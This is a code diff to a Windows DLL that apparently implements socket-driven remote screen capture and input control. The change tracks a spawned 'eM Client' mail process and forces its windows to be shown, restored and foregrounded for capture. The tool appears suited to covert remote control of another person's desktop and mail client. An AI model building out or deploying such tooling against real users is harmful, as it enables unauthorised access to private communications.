@@ -75,6 +75,7 @@ static const uint32_t FRAME_FORMAT_JPEG_COMPRESSED = 3;
 static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;
 
 static atomic_bool g_captureRunning(false);
+static atomic<DWORD> g_spawnedMailClientPid(0);
 static thread g_captureThread;
 static mutex g_captureMutex;
 static mutex g_sendMutex;
@@ -690,6 +691,24 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
     return false;
 }
 
+static bool GetProcessNameByPid(DWORD pid, wstring& outName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (pe32.th32ProcessID == pid) {
+                outName = pe32.szExeFile;
+                CloseHandle(hSnap);
+                return true;
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+    return false;
+}
+
 static void kill_process_by_name(const wstring& exeName) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
@@ -944,6 +963,41 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD pid = 0;
+                GetWindowThreadProcessId(hwnd, &pid);
+                bool isMailClient = false;
+                if (pid != 0) {
+                    if (pid == g_spawnedMailClientPid.load()) {
+                        isMailClient = true;
+                    } else {
+                        wstring procName;
+                        if (GetProcessNameByPid(pid, procName)) {
+                            if (_wcsicmp(procName.c_str(), L"MailClient.exe") == 0) {
+                                isMailClient = true;
+                            }
+                        }
+                    }
+                }
+
+                if (isMailClient) {
+                    wchar_t className[256] = {0};
+                    GetClassNameW(hwnd, className, 256);
+                    if (wcsncmp(className, L"HwndWrapper", 11) == 0) {
+                        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                        if ((style & WS_CAPTION) && (style & WS_SYSMENU)) {
+                            if (IsIconic(hwnd)) {
+                                ShowWindow(hwnd, SW_RESTORE);
+                                SetForegroundWindow(hwnd);
+                            } else if (!IsWindowVisible(hwnd)) {
+                                ShowWindow(hwnd, SW_SHOW);
+                                ShowWindow(hwnd, SW_RESTORE);
+                                SetForegroundWindow(hwnd);
+                            }
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -2132,6 +2186,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
             g_lastInteractiveFullFrameTick = 0;
+            g_spawnedMailClientPid = 0;
             {
                 lock_guard<mutex> lock(g_inputMutex);
                 g_inputQueue.clear();
@@ -2492,6 +2547,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_spawnedMailClientPid = pi.dwProcessId;
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
